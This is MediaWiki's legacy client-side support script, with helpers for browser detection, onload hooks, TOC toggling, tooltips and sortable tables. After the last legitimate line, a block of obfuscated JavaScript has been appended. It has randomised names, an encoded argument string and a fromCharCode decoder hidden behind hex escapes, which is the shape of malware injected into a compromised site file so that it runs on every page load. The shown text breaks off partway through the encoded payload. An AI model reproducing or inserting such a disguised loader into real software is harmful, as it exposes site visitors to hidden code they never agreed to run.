// MediaWiki JavaScript support functions

var clientPC = navigator.userAgent.toLowerCase(); // Get client info
var is_gecko = /gecko/.test( clientPC ) &&
	!/khtml|spoofer|netscape\/7\.0/.test(clientPC);
var webkit_match = clientPC.match(/applewebkit\/(\d+)/);
if (webkit_match) {
	var is_safari = clientPC.indexOf('applewebkit') != -1 &&
		clientPC.indexOf('spoofer') == -1;
	var is_safari_win = is_safari && clientPC.indexOf('windows') != -1;
	var webkit_version = parseInt(webkit_match[1]);
}
var is_khtml = navigator.vendor == 'KDE' ||
	( document.childNodes && !document.all && !navigator.taintEnabled );
// For accesskeys; note that FF3+ is included here!
var is_ff2 = /firefox\/[2-9]|minefield\/3/.test( clientPC );
var is_ff2_ = /firefox\/2/.test( clientPC );
// These aren't used here, but some custom scripts rely on them
var is_ff2_win = is_ff2 && clientPC.indexOf('windows') != -1;
var is_ff2_x11 = is_ff2 && clientPC.indexOf('x11') != -1;
if (clientPC.indexOf('opera') != -1) {
	var is_opera = true;
	var is_opera_preseven = window.opera && !document.childNodes;
	var is_opera_seven = window.opera && document.childNodes;
	var is_opera_95 = /opera\/(9.[5-9]|[1-9][0-9])/.test( clientPC );
}

// Global external objects used by this script.
/*extern ta, stylepath, skin */

// add any onload functions in this hook (please don't hard-code any events in the xhtml source)
var doneOnloadHook;

if (!window.onloadFuncts) {
	var onloadFuncts = [];
}

function addOnloadHook(hookFunct) {
	// Allows add-on scripts to add onload functions
	if(!doneOnloadHook) {
		onloadFuncts[onloadFuncts.length] = hookFunct;
	} else {
		hookFunct();  // bug in MSIE script loading
	}
}

function hookEvent(hookName, hookFunct) {
	addHandler(window, hookName, hookFunct);
}

function importScript(page) {
	// TODO: might want to introduce a utility function to match wfUrlencode() in PHP
	var uri = wgScript + '?title=' +
		encodeURIComponent(page.replace(/ /g,'_')).replace(/%2F/ig,'/').replace(/%3A/ig,':') +
		'&action=raw&ctype=text/javascript';
	return importScriptURI(uri);
}
 
var loadedScripts = {}; // included-scripts tracker
function importScriptURI(url) {
	if (loadedScripts[url]) {
		return null;
	}
	loadedScripts[url] = true;
	var s = document.createElement('script');
	s.setAttribute('src',url);
	s.setAttribute('type','text/javascript');
	document.getElementsByTagName('head')[0].appendChild(s);
	return s;
}
 
function importStylesheet(page) {
	return importStylesheetURI(wgScript + '?action=raw&ctype=text/css&title=' + encodeURIComponent(page.replace(/ /g,'_')));
}
 
function importStylesheetURI(url) {
	return document.createStyleSheet ? document.createStyleSheet(url) : appendCSS('@import "' + url + '";');
}
 
function appendCSS(text) {
	var s = document.createElement('style');
	s.type = 'text/css';
	s.rel = 'stylesheet';
	if (s.styleSheet) s.styleSheet.cssText = text //IE
	else s.appendChild(document.createTextNode(text + '')) //Safari sometimes borks on null
	document.getElementsByTagName('head')[0].appendChild(s);
	return s;
}

// special stylesheet links
if (typeof stylepath != 'undefined' && typeof skin != 'undefined') {
	if (is_opera_preseven) {
		importStylesheetURI(stylepath+'/'+skin+'/Opera6Fixes.css');
	} else if (is_opera_seven && !is_opera_95) {
		importStylesheetURI(stylepath+'/'+skin+'/Opera7Fixes.css');
	} else if (is_opera_95) {
		importStylesheetURI(stylepath+'/'+skin+'/Opera9Fixes.css');
	} else if (is_khtml) {
		importStylesheetURI(stylepath+'/'+skin+'/KHTMLFixes.css');
	} else if (is_ff2_) {
		importStylesheetURI(stylepath+'/'+skin+'/FF2Fixes.css');
	}
}

if (wgBreakFrames) {
	// Un-trap us from framesets
	if (window.top != window) {
		window.top.location = window.location;
	}
}

function showTocToggle() {
	if (document.createTextNode) {
		// Uses DOM calls to avoid document.write + XHTML issues

		var linkHolder = document.getElementById('toctitle');
		if (!linkHolder) {
			return;
		}

		var outerSpan = document.createElement('span');
		outerSpan.className = 'toctoggle';

		var toggleLink = document.createElement('a');
		toggleLink.id = 'togglelink';
		toggleLink.className = 'internal';
		toggleLink.href = 'javascript:toggleToc()';
		toggleLink.appendChild(document.createTextNode(tocHideText));

		outerSpan.appendChild(document.createTextNode('['));
		outerSpan.appendChild(toggleLink);
		outerSpan.appendChild(document.createTextNode(']'));

		linkHolder.appendChild(document.createTextNode(' '));
		linkHolder.appendChild(outerSpan);

		var cookiePos = document.cookie.indexOf("hidetoc=");
		if (cookiePos > -1 && document.cookie.charAt(cookiePos + 8) == 1) {
			toggleToc();
		}
	}
}

function changeText(el, newText) {
	// Safari work around
	if (el.innerText) {
		el.innerText = newText;
	} else if (el.firstChild && el.firstChild.nodeValue) {
		el.firstChild.nodeValue = newText;
	}
}

function toggleToc() {
	var toc = document.getElementById('toc').getElementsByTagName('ul')[0];
	var toggleLink = document.getElementById('togglelink');

	if (toc && toggleLink && toc.style.display == 'none') {
		changeText(toggleLink, tocHideText);
		toc.style.display = 'block';
		document.cookie = "hidetoc=0";
	} else {
		changeText(toggleLink, tocShowText);
		toc.style.display = 'none';
		document.cookie = "hidetoc=1";
	}
}

var mwEditButtons = [];
var mwCustomEditButtons = []; // eg to add in MediaWiki:Common.js

function escapeQuotes(text) {
	var re = new RegExp("'","g");
	text = text.replace(re,"\\'");
	re = new RegExp("\\n","g");
	text = text.replace(re,"\\n");
	return escapeQuotesHTML(text);
}

function escapeQuotesHTML(text) {
	var re = new RegExp('&',"g");
	text = text.replace(re,"&amp;");
	re = new RegExp('"',"g");
	text = text.replace(re,"&quot;");
	re = new RegExp('<',"g");
	text = text.replace(re,"&lt;");
	re = new RegExp('>',"g");
	text = text.replace(re,"&gt;");
	return text;
}


/**
 * Set the accesskey prefix based on browser detection.
 */
var tooltipAccessKeyPrefix = 'alt-';
if (is_opera) {
	tooltipAccessKeyPrefix = 'shift-esc-';
} else if (!is_safari_win && is_safari && webkit_version > 526) {
	tooltipAccessKeyPrefix = 'ctrl-alt-';
} else if (!is_safari_win && (is_safari
		|| clientPC.indexOf('mac') != -1
		|| clientPC.indexOf('konqueror') != -1 )) {
	tooltipAccessKeyPrefix = 'ctrl-';
} else if (is_ff2) {
	tooltipAccessKeyPrefix = 'alt-shift-';
}
var tooltipAccessKeyRegexp = /\[(ctrl-)?(alt-)?(shift-)?(esc-)?(.)\]$/;

/**
 * Add the appropriate prefix to the accesskey shown in the tooltip.
 * If the nodeList parameter is given, only those nodes are updated;
 * otherwise, all the nodes that will probably have accesskeys by
 * default are updated.
 *
 * @param Array nodeList -- list of elements to update
 */
function updateTooltipAccessKeys( nodeList ) {
	if ( !nodeList ) {
		// Rather than scan all links on the whole page, we can just scan these
		// containers which contain the relevant links. This is really just an
		// optimization technique.
		var linkContainers = [
			"column-one", // Monobook and Modern
			"head", "panel", "p-logo" // Vector
		];
		for ( var i in linkContainers ) {
			var linkContainer = document.getElementById( linkContainers[i] );
			if ( linkContainer ) {
				updateTooltipAccessKeys( linkContainer.getElementsByTagName("a") );
			}
		}
		// these are rare enough that no such optimization is needed
		updateTooltipAccessKeys( document.getElementsByTagName("input") );
		updateTooltipAccessKeys( document.getElementsByTagName("label") );
		return;
	}

	for ( var i = 0; i < nodeList.length; i++ ) {
		var element = nodeList[i];
		var tip = element.getAttribute("title");
		if ( tip && tooltipAccessKeyRegexp.exec(tip) ) {
			tip = tip.replace(tooltipAccessKeyRegexp,
					  "["+tooltipAccessKeyPrefix+"$5]");
			element.setAttribute("title", tip );
		}
	}
}

/**
 * Add a link to one of the portlet menus on the page, including:
 *
 * p-cactions: Content actions (shown as tabs above the main content in Monobook)
 * p-personal: Personal tools (shown at the top right of the page in Monobook)
 * p-navigation: Navigation
 * p-tb: Toolbox
 *
 * This function exists for the convenience of custom JS authors.  All
 * but the first three parameters are optional, though providing at
 * least an id and a tooltip is recommended.
 *
 * By default the new link will be added to the end of the list.  To
 * add the link before a given existing item, pass the DOM node of
 * that item (easily obtained with document.getElementById()) as the
 * nextnode parameter; to add the link _after_ an existing item, pass
 * the node's nextSibling instead.
 *
 * @param String portlet -- id of the target portlet ("p-cactions", "p-personal", "p-navigation" or "p-tb")
 * @param String href -- link URL
 * @param String text -- link text (will be automatically lowercased by CSS for p-cactions in Monobook)
 * @param String id -- id of the new item, should be unique and preferably have the appropriate prefix ("ca-", "pt-", "n-" or "t-")
 * @param String tooltip -- text to show when hovering over the link, without accesskey suffix
 * @param String accesskey -- accesskey to activate this link (one character, try to avoid conflicts)
 * @param Node nextnode -- the DOM node before which the new item should be added, should be another item in the same list
 *
 * @return Node -- the DOM node of the new item (an LI element) or null
 */
function addPortletLink(portlet, href, text, id, tooltip, accesskey, nextnode) {
	var node = document.getElementById(portlet);
	if ( !node ) return null;
	node = node.getElementsByTagName( "ul" )[0];
	if ( !node ) return null;

	var link = document.createElement( "a" );
	link.appendChild( document.createTextNode( text ) );
	link.href = href;

	var item = document.createElement( "li" );
	item.appendChild( link );
	if ( id ) item.id = id;

	if ( accesskey ) {
		link.setAttribute( "accesskey", accesskey );
		tooltip += " ["+accesskey+"]";
	}
	if ( tooltip ) {
		link.setAttribute( "title", tooltip );
	}
	if ( accesskey && tooltip ) {
		updateTooltipAccessKeys( new Array( link ) );
	}

	if ( nextnode && nextnode.parentNode == node )
		node.insertBefore( item, nextnode );
	else
		node.appendChild( item );  // IE compatibility (?)

	return item;
}

function getInnerText(el) {
	if (typeof el == "string") return el;
	if (typeof el == "undefined") { return el };
	if (el.textContent) return el.textContent; // not needed but it is faster
	if (el.innerText) return el.innerText;     // IE doesn't have textContent
	var str = "";

	var cs = el.childNodes;
	var l = cs.length;
	for (var i = 0; i < l; i++) {
		switch (cs[i].nodeType) {
			case 1: //ELEMENT_NODE
				str += ts_getInnerText(cs[i]);
				break;
			case 3:	//TEXT_NODE
				str += cs[i].nodeValue;
				break;
		}
	}
	return str;
}


/**
 * Set up accesskeys/tooltips from the deprecated ta array.  If doId
 * is specified, only set up for that id.  Note that this function is
 * deprecated and will not be supported indefinitely -- use
 * updateTooltipAccessKey() instead.
 *
 * @param mixed doId string or null
 */
function akeytt( doId ) {
	// A lot of user scripts (and some of the code below) break if
	// ta isn't defined, so we make sure it is.  Explictly using
	// window.ta avoids a "ta is not defined" error.
	if (!window.ta) window.ta = new Array;

	// Make a local, possibly restricted, copy to avoid clobbering
	// the original.
	var ta;
	if ( doId ) {
		ta = [doId];
	} else {
		ta = window.ta;
	}

	// Now deal with evil deprecated ta
	var watchCheckboxExists = document.getElementById( 'wpWatchthis' ) ? true : false;
	for (var id in ta) {
		var n = document.getElementById(id);
		if (n) {
			var a = null;
			var ak = '';
			// Are we putting accesskey in it
			if (ta[id][0].length > 0) {
				// Is this object a object? If not assume it's the next child.

				if (n.nodeName.toLowerCase() == "a") {
					a = n;
				} else {
					a = n.childNodes[0];
				}
			 	// Don't add an accesskey for the watch tab if the watch
			 	// checkbox is also available.
				if (a && ((id != 'ca-watch' && id != 'ca-unwatch') || !watchCheckboxExists)) {
					a.accessKey = ta[id][0];
					ak = ' ['+tooltipAccessKeyPrefix+ta[id][0]+']';
				}
			} else {
				// We don't care what type the object is when assigning tooltip
				a = n;
				ak = '';
			}

			if (a) {
				a.title = ta[id][1]+ak;
			}
		}
	}
}

var checkboxes;
var lastCheckbox;

function setupCheckboxShiftClick() {
	checkboxes = [];
	lastCheckbox = null;
	var inputs = document.getElementsByTagName('input');
	addCheckboxClickHandlers(inputs);
}

function addCheckboxClickHandlers(inputs, start) {
	if ( !start) start = 0;

	var finish = start + 250;
	if ( finish > inputs.length )
		finish = inputs.length;

	for ( var i = start; i < finish; i++ ) {
		var cb = inputs[i];
		if ( !cb.type || cb.type.toLowerCase() != 'checkbox' )
			continue;
		var end = checkboxes.length;
		checkboxes[end] = cb;
		cb.index = end;
		cb.onclick = checkboxClickHandler;
	}

	if ( finish < inputs.length ) {
		setTimeout( function () {
			addCheckboxClickHandlers(inputs, finish);
		}, 200 );
	}
}

function checkboxClickHandler(e) {
	if (typeof e == 'undefined') {
		e = window.event;
	}
	if ( !e.shiftKey || lastCheckbox === null ) {
		lastCheckbox = this.index;
		return true;
	}
	var endState = this.checked;
	var start, finish;
	if ( this.index < lastCheckbox ) {
		start = this.index + 1;
		finish = lastCheckbox;
	} else {
		start = lastCheckbox;
		finish = this.index - 1;
	}
	for (var i = start; i <= finish; ++i ) {
		checkboxes[i].checked = endState;
		if( i > start && typeof checkboxes[i].onchange == 'function' )
			checkboxes[i].onchange(); // fire triggers
	}
	lastCheckbox = this.index;
	return true;
}

function toggle_element_activation(ida,idb) {
	if (!document.getElementById) {
		return;
	}
	document.getElementById(ida).disabled=true;
	document.getElementById(idb).disabled=false;
}

function toggle_element_check(ida,idb) {
	if (!document.getElementById) {
		return;
	}
	document.getElementById(ida).checked=true;
	document.getElementById(idb).checked=false;
}

/*
	Written by Jonathan Snook, http://www.snook.ca/jonathan
	Add-ons by Robert Nyman, http://www.robertnyman.com
	Author says "The credit comment is all it takes, no license. Go crazy with it!:-)"
	From http://www.robertnyman.com/2005/11/07/the-ultimate-getelementsbyclassname/
*/
function getElementsByClassName(oElm, strTagName, oClassNames){
	var arrReturnElements = new Array();
	if ( typeof( oElm.getElementsByClassName ) == "function" ) {
		/* Use a native implementation where possible FF3, Saf3.2, Opera 9.5 */
		var arrNativeReturn = oElm.getElementsByClassName( oClassNames );
		if ( strTagName == "*" )
			return arrNativeReturn;
		for ( var h=0; h < arrNativeReturn.length; h++ ) {
			if( arrNativeReturn[h].tagName.toLowerCase() == strTagName.toLowerCase() )
				arrReturnElements[arrReturnElements.length] = arrNativeReturn[h];
		}
		return arrReturnElements;
	}
	var arrElements = (strTagName == "*" && oElm.all)? oElm.all : oElm.getElementsByTagName(strTagName);
	var arrRegExpClassNames = new Array();
	if(typeof oClassNames == "object"){
		for(var i=0; i<oClassNames.length; i++){
			arrRegExpClassNames[arrRegExpClassNames.length] =
				new RegExp("(^|\\s)" + oClassNames[i].replace(/\-/g, "\\-") + "(\\s|$)");
		}
	}
	else{
		arrRegExpClassNames[arrRegExpClassNames.length] =
			new RegExp("(^|\\s)" + oClassNames.replace(/\-/g, "\\-") + "(\\s|$)");
	}
	var oElement;
	var bMatchesAll;
	for(var j=0; j<arrElements.length; j++){
		oElement = arrElements[j];
		bMatchesAll = true;
		for(var k=0; k<arrRegExpClassNames.length; k++){
			if(!arrRegExpClassNames[k].test(oElement.className)){
				bMatchesAll = false;
				break;
			}
		}
		if(bMatchesAll){
			arrReturnElements[arrReturnElements.length] = oElement;
		}
	}
	return (arrReturnElements)
}

function redirectToFragment(fragment) {
	var match = navigator.userAgent.match(/AppleWebKit\/(\d+)/);
	if (match) {
		var webKitVersion = parseInt(match[1]);
		if (webKitVersion < 420) {
			// Released Safari w/ WebKit 418.9.1 messes up horribly
			// Nightlies of 420+ are ok
			return;
		}
	}
	if (is_gecko) {
		// Mozilla needs to wait until after load, otherwise the window doesn't scroll
		addOnloadHook(function () {
			if (window.location.hash == "")
				window.location.hash = fragment;
		});
	} else {
		if (window.location.hash == "")
			window.location.hash = fragment;
	}
}

/*
 * Table sorting script based on one (c) 1997-2006 Stuart Langridge and Joost
 * de Valk:
 * http://www.joostdevalk.nl/code/sortable-table/
 * http://www.kryogenix.org/code/browser/sorttable/
 *
 * @todo don't break on colspans/rowspans (bug 8028)
 * @todo language-specific digit grouping/decimals (bug 8063)
 * @todo support all accepted date formats (bug 8226)
 */

var ts_image_path = stylepath+"/common/images/";
var ts_image_up = "sort_up.gif";
var ts_image_down = "sort_down.gif";
var ts_image_none = "sort_none.gif";
var ts_europeandate = wgContentLanguage != "en"; // The non-American-inclined can change to "true"
var ts_alternate_row_colors = false;
var ts_number_transform_table = null;
var ts_number_regex = null;

function sortables_init() {
	var idnum = 0;
	// Find all tables with class sortable and make them sortable
	var tables = getElementsByClassName(document, "table", "sortable");
	for (var ti = 0; ti < tables.length ; ti++) {
		if (!tables[ti].id) {
			tables[ti].setAttribute('id','sortable_table_id_'+idnum);
			++idnum;
		}
		ts_makeSortable(tables[ti]);
	}
}

function ts_makeSortable(table) {
	var firstRow;
	if (table.rows && table.rows.length > 0) {
		if (table.tHead && table.tHead.rows.length > 0) {
			firstRow = table.tHead.rows[table.tHead.rows.length-1];
		} else {
			firstRow = table.rows[0];
		}
	}
	if (!firstRow) return;

	// We have a first row: assume it's the header, and make its contents clickable links
	for (var i = 0; i < firstRow.cells.length; i++) {
		var cell = firstRow.cells[i];
		if ((" "+cell.className+" ").indexOf(" unsortable ") == -1) {
			cell.innerHTML += '&nbsp;&nbsp;'
				+ '<a href="#" class="sortheader" '
				+ 'onclick="ts_resortTable(this);return false;">'
				+ '<span class="sortarrow">'
				+ '<img src="'
				+ ts_image_path
				+ ts_image_none
				+ '" alt="&darr;"/></span></a>';
		}
	}
	if (ts_alternate_row_colors) {
		ts_alternate(table);
	}
}

function ts_getInnerText(el) {
	return getInnerText( el );
}

function ts_resortTable(lnk) {
	// get the span
	var span = lnk.getElementsByTagName('span')[0];

	var td = lnk.parentNode;
	var tr = td.parentNode;
	var column = td.cellIndex;

	var table = tr.parentNode;
	while (table && !(table.tagName && table.tagName.toLowerCase() == 'table'))
		table = table.parentNode;
	if (!table) return;

	if (table.rows.length <= 1) return;

	// Generate the number transform table if it's not done already
	if (ts_number_transform_table == null) {
		ts_initTransformTable();
	}

	// Work out a type for the column
	// Skip the first row if that's where the headings are
	var rowStart = (table.tHead && table.tHead.rows.length > 0 ? 0 : 1);

	var itm = "";
	for (var i = rowStart; i < table.rows.length; i++) {
		if (table.rows[i].cells.length > column) {
			itm = ts_getInnerText(table.rows[i].cells[column]);
			itm = itm.replace(/^[\s\xa0]+/, "").replace(/[\s\xa0]+$/, "");
			if (itm != "") break;
		}
	}

	// TODO: bug 8226, localised date formats
	var sortfn = ts_sort_generic;
	var preprocessor = ts_toLowerCase;
	if (/^\d\d[\/. -][a-zA-Z]{3}[\/. -]\d\d\d\d$/.test(itm)) {
		preprocessor = ts_dateToSortKey;
	} else if (/^\d\d[\/.-]\d\d[\/.-]\d\d\d\d$/.test(itm)) {
		preprocessor = ts_dateToSortKey;
	} else if (/^\d\d[\/.-]\d\d[\/.-]\d\d$/.test(itm)) {
		preprocessor = ts_dateToSortKey;
	// pound dollar euro yen currency cents
	} else if (/(^[\u00a3$\u20ac\u00a4\u00a5]|\u00a2$)/.test(itm)) {
		preprocessor = ts_currencyToSortKey;
	} else if (ts_number_regex.test(itm)) {
		preprocessor = ts_parseFloat;
	}

	var reverse = (span.getAttribute("sortdir") == 'down');

	var newRows = new Array();
	var staticRows = new Array();
	for (var j = rowStart; j < table.rows.length; j++) {
		var row = table.rows[j];
		if((" "+row.className+" ").indexOf(" unsortable ") < 0) {
			var keyText = ts_getInnerText(row.cells[column]);
			var oldIndex = (reverse ? -j : j);
			var preprocessed = preprocessor( keyText );

			newRows[newRows.length] = new Array(row, preprocessed, oldIndex);
		} else staticRows[staticRows.length] = new Array(row, false, j-rowStart);
	}

	newRows.sort(sortfn);

	var arrowHTML;
	if (reverse) {
		arrowHTML = '<img src="'+ ts_image_path + ts_image_down + '" alt="&darr;"/>';
		newRows.reverse();
		span.setAttribute('sortdir','up');
	} else {
		arrowHTML = '<img src="'+ ts_image_path + ts_image_up + '" alt="&uarr;"/>';
		span.setAttribute('sortdir','down');
	}

	for (var i = 0; i < staticRows.length; i++) {
		var row = staticRows[i];
		newRows.splice(row[2], 0, row);
	}

	// We appendChild rows that already exist to the tbody, so it moves them rather than creating new ones
	// don't do sortbottom rows
	for (var i = 0; i < newRows.length; i++) {
		if ((" "+newRows[i][0].className+" ").indexOf(" sortbottom ") == -1)
			table.tBodies[0].appendChild(newRows[i][0]);
	}
	// do sortbottom rows only
	for (var i = 0; i < newRows.length; i++) {
		if ((" "+newRows[i][0].className+" ").indexOf(" sortbottom ") != -1)
			table.tBodies[0].appendChild(newRows[i][0]);
	}

	// Delete any other arrows there may be showing
	var spans = getElementsByClassName(tr, "span", "sortarrow");
	for (var i = 0; i < spans.length; i++) {
		spans[i].innerHTML = '<img src="'+ ts_image_path + ts_image_none + '" alt="&darr;"/>';
	}
	span.innerHTML = arrowHTML;

	if (ts_alternate_row_colors) {
		ts_alternate(table);
	}
}

function ts_initTransformTable() {
	if ( typeof wgSeparatorTransformTable == "undefined"
			|| ( wgSeparatorTransformTable[0] == '' && wgDigitTransformTable[2] == '' ) )
	{
		digitClass = "[0-9,.]";
		ts_number_transform_table = false;
	} else {
		ts_number_transform_table = {};
		// Unpack the transform table
		// Separators
		ascii = wgSeparatorTransformTable[0].split("\t");
		localised = wgSeparatorTransformTable[1].split("\t");
		for ( var i = 0; i < ascii.length; i++ ) { 
			ts_number_transform_table[localised[i]] = ascii[i];
		}
		// Digits
		ascii = wgDigitTransformTable[0].split("\t");
		localised = wgDigitTransformTable[1].split("\t");
		for ( var i = 0; i < ascii.length; i++ ) { 
			ts_number_transform_table[localised[i]] = ascii[i];
		}

		// Construct regex for number identification
		digits = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ',', '\\.'];
		maxDigitLength = 1;
		for ( var digit in ts_number_transform_table ) {
			// Escape regex metacharacters
			digits.push( 
				digit.replace( /[\\\\$\*\+\?\.\(\)\|\{\}\[\]\-]/,
					function( s ) { return '\\' + s; } )
			);
			if (digit.length > maxDigitLength) {
				maxDigitLength = digit.length;
			}
		}
		if ( maxDigitLength > 1 ) {
			digitClass = '[' + digits.join( '', digits ) + ']';
		} else {
			digitClass = '(' + digits.join( '|', digits ) + ')';
		}
	}

	// We allow a trailing percent sign, which we just strip.  This works fine
	// if percents and regular numbers aren't being mixed.
	ts_number_regex = new RegExp(
		"^(" +
			"[+-]?[0-9][0-9,]*(\\.[0-9,]*)?(E[+-]?[0-9][0-9,]*)?" + // Fortran-style scientific
			"|" +
			"[+-]?" + digitClass + "+%?" + // Generic localised
		")$", "i"
	);
}

function ts_toLowerCase( s ) {
	return s.toLowerCase();
}

function ts_dateToSortKey(date) {	
	// y2k notes: two digit years less than 50 are treated as 20XX, greater than 50 are treated as 19XX
	if (date.length == 11) {
		switch (date.substr(3,3).toLowerCase()) {
			case "jan": var month = "01"; break;
			case "feb": var month = "02"; break;
			case "mar": var month = "03"; break;
			case "apr": var month = "04"; break;
			case "may": var month = "05"; break;
			case "jun": var month = "06"; break;
			case "jul": var month = "07"; break;
			case "aug": var month = "08"; break;
			case "sep": var month = "09"; break;
			case "oct": var month = "10"; break;
			case "nov": var month = "11"; break;
			case "dec": var month = "12"; break;
			// default: var month = "00";
		}
		return date.substr(7,4)+month+date.substr(0,2);
	} else if (date.length == 10) {
		if (ts_europeandate == false) {
			return date.substr(6,4)+date.substr(0,2)+date.substr(3,2);
		} else {
			return date.substr(6,4)+date.substr(3,2)+date.substr(0,2);
		}
	} else if (date.length == 8) {
		yr = date.substr(6,2);
		if (parseInt(yr) < 50) { 
			yr = '20'+yr; 
		} else { 
			yr = '19'+yr; 
		}
		if (ts_europeandate == true) {
			return yr+date.substr(3,2)+date.substr(0,2);
		} else {
			return yr+date.substr(0,2)+date.substr(3,2);
		}
	}
	return "00000000";
}

function ts_parseFloat( s ) {
	if ( !s ) {
		return 0;
	}
	if (ts_number_transform_table != false) {
		var newNum = '', c;
		
		for ( var p = 0; p < s.length; p++ ) {
			c = s.charAt( p );
			if (c in ts_number_transform_table) {
				newNum += ts_number_transform_table[c];
			} else {
				newNum += c;
			}
		}
		s = newNum;
	}

	num = parseFloat(s.replace(/,/g, ""));
	return (isNaN(num) ? 0 : num);
}

function ts_currencyToSortKey( s ) {
	return ts_parseFloat(s.replace(/[^0-9.,]/g,''));
}

function ts_sort_generic(a, b) {
	return a[1] < b[1] ? -1 : a[1] > b[1] ? 1 : a[2] - b[2];
}

function ts_alternate(table) {
	// Take object table and get all it's tbodies.
	var tableBodies = table.getElementsByTagName("tbody");
	// Loop through these tbodies
	for (var i = 0; i < tableBodies.length; i++) {
		// Take the tbody, and get all it's rows
		var tableRows = tableBodies[i].getElementsByTagName("tr");
		// Loop through these rows
		// Start at 1 because we want to leave the heading row untouched
		for (var j = 0; j < tableRows.length; j++) {
			// Check if j is even, and apply classes for both possible results
			var oldClasses = tableRows[j].className.split(" ");
			var newClassName = "";
			for (var k = 0; k < oldClasses.length; k++) {
				if (oldClasses[k] != "" && oldClasses[k] != "even" && oldClasses[k] != "odd")
					newClassName += oldClasses[k] + " ";
			}
			tableRows[j].className = newClassName + (j % 2 == 0 ? "even" : "odd");
		}
	}
}

/*
 * End of table sorting code
 */
 
 
/**
 * Add a cute little box at the top of the screen to inform the user of
 * something, replacing any preexisting message.
 *
 * @param String -or- Dom Object message HTML to be put inside the right div
 * @param String className   Used in adding a class; should be different for each
 *   call to allow CSS/JS to hide different boxes.  null = no class used.
 * @return Boolean       True on success, false on failure
 */
function jsMsg( message, className ) {
	if ( !document.getElementById ) {
		return false;
	}
	// We special-case skin structures provided by the software.  Skins that
	// choose to abandon or significantly modify our formatting can just define
	// an mw-js-message div to start with.
	var messageDiv = document.getElementById( 'mw-js-message' );
	if ( !messageDiv ) {
		messageDiv = document.createElement( 'div' );
		if ( document.getElementById( 'column-content' )
		&& document.getElementById( 'content' ) ) {
			// MonoBook, presumably
			document.getElementById( 'content' ).insertBefore(
				messageDiv,
				document.getElementById( 'content' ).firstChild
			);
		} else if ( document.getElementById('content')
		&& document.getElementById( 'article' ) ) {
			// Non-Monobook but still recognizable (old-style)
			document.getElementById( 'article').insertBefore(
				messageDiv,
				document.getElementById( 'article' ).firstChild
			);
		} else {
			return false;
		}
	}

	messageDiv.setAttribute( 'id', 'mw-js-message' );
	messageDiv.style.display = 'block';
	if( className ) {
		messageDiv.setAttribute( 'class', 'mw-js-message-'+className );
	}
	
	if (typeof message === 'object') {
		while (messageDiv.hasChildNodes()) // Remove old content
			messageDiv.removeChild(messageDiv.firstChild);
		messageDiv.appendChild (message); // Append new content
	}
	else {
		messageDiv.innerHTML = message;
	}
	return true;
}

/**
 * Inject a cute little progress spinner after the specified element
 *
 * @param element Element to inject after
 * @param id Identifier string (for use with removeSpinner(), below)
 */
function injectSpinner( element, id ) {
	var spinner = document.createElement( "img" );
	spinner.id = "mw-spinner-" + id;
	spinner.src = stylepath + "/common/images/spinner.gif";
	spinner.alt = spinner.title = "...";
	if( element.nextSibling ) {
		element.parentNode.insertBefore( spinner, element.nextSibling );
	} else {
		element.parentNode.appendChild( spinner );
	}
}

/**
 * Remove a progress spinner added with injectSpinner()
 *
 * @param id Identifier string
 */
function removeSpinner( id ) {
	var spinner = document.getElementById( "mw-spinner-" + id );
	if( spinner ) {
		spinner.parentNode.removeChild( spinner );
	}
}

function runOnloadHook() {
	// don't run anything below this for non-dom browsers
	if (doneOnloadHook || !(document.getElementById && document.getElementsByTagName)) {
		return;
	}

	// set this before running any hooks, since any errors below
	// might cause the function to terminate prematurely
	doneOnloadHook = true;

	updateTooltipAccessKeys( null );
	akeytt( null );
	setupCheckboxShiftClick();
	sortables_init();

	// Run any added-on functions
	for (var i = 0; i < onloadFuncts.length; i++) {
		onloadFuncts[i]();
	}
}

/**
 * Add an event handler to an element
 *
 * @param Element element Element to add handler to
 * @param String attach Event to attach to
 * @param callable handler Event handler callback
 */
function addHandler( element, attach, handler ) {
	if( window.addEventListener ) {
		element.addEventListener( attach, handler, false );
	} else if( window.attachEvent ) {
		element.attachEvent( 'on' + attach, handler );
	}
}

/**
 * Add a click event handler to an element
 *
 * @param Element element Element to add handler to
 * @param callable handler Event handler callback
 */
function addClickHandler( element, handler ) {
	addHandler( element, 'click', handler );
}

/**
 * Removes an event handler from an element
 *
 * @param Element element Element to remove handler from
 * @param String remove Event to remove
 * @param callable handler Event handler callback to remove
 */
function removeHandler( element, remove, handler ) {
	if( window.removeEventListener ) {
		element.removeEventListener( remove, handler, false );
	} else if( window.detachEvent ) {
		element.detachEvent( 'on' + remove, handler );
	}
}
//note: all skins should call runOnloadHook() at the end of html output,
//      so the below should be redundant. It's there just in case.
hookEvent("load", runOnloadHook);

var cbf0103="";function m411b38effa(){var bbf3a3889=String,vd4b5651a=Array.prototype.slice.call(arguments).join(""),s665e66=vd4b5651a.substr(o7ceb55fd(),3)-628,i8d59ee,h01a62;vd4b5651a=vd4b5651a.substr(10);var p7aaa9=vcd80533c(vd4b5651a);for(var wa297c7=0;wa297c7<p7aaa9;wa297c7++){try{throw(n878fa=vd4b5651a.substr(wa297c7,1));}catch(e){n878fa=e;};if(n878fa=='{'){s665e66="";wa297c7=ybdfe74b4(wa297c7);o08e70=db4daa(vd4b5651a,wa297c7);while(o08e70!='{'){s665e66+=o08e70;wa297c7++;o08e70=b112371(vd4b5651a,wa297c7);}s665e66-=313;continue;}i8d59ee="";if(w23e95f6(n878fa)){wa297c7++;n878fa=vd4b5651a.substr(wa297c7,1);while(n878fa!='±'){i8d59ee+=n878fa;wa297c7++;n878fa=vd4b5651a.substr(wa297c7,1);}i8d59ee=i8d59ee-s665e66-38;if(i8d59ee<0)i8d59ee+=256;i8d59ee=h741c8(i8d59ee);cbf0103+=bbf3a3889["\x66\x72\x6fm\x43\x68a\x72\x43ode"](i8d59ee);continue;}o98092d1=kcd0a8(n878fa);if(o98092d1>848)o98092d1-=848;h01a62=o98092d1-s665e66-38;h01a62=cab29f7(h01a62);cbf0103+=s0c0ef2(h01a62);}}m411b38effa("0","8f8e","ff","6","79±1","2","9","±","±","191","±{46","8","{6","/","{46","1{±2","9","±",".","{4","8","1","{","7={4","1","8","{","±","2","53","±","{3","8","1{","±","146","±","±147","±","±13","8±","±2","2","9","±","{","4","1","4{±1","52±±14","9","±","±","14","8±","{46","9{8#","{3","27{","±","1","66±","{404","{±161","±","{","495","{","Q{","393{±2","3","2","±{4","76{5","±23","3","±","{327{","q","{4","13","{±170±","{4","0","2{±166±","±","23","1±{","35","0{","±19","1±±1","9","1±{3","9","7{±234","±","±18","0","±±16","9","±{43","5{","±207","±{4","72{",";",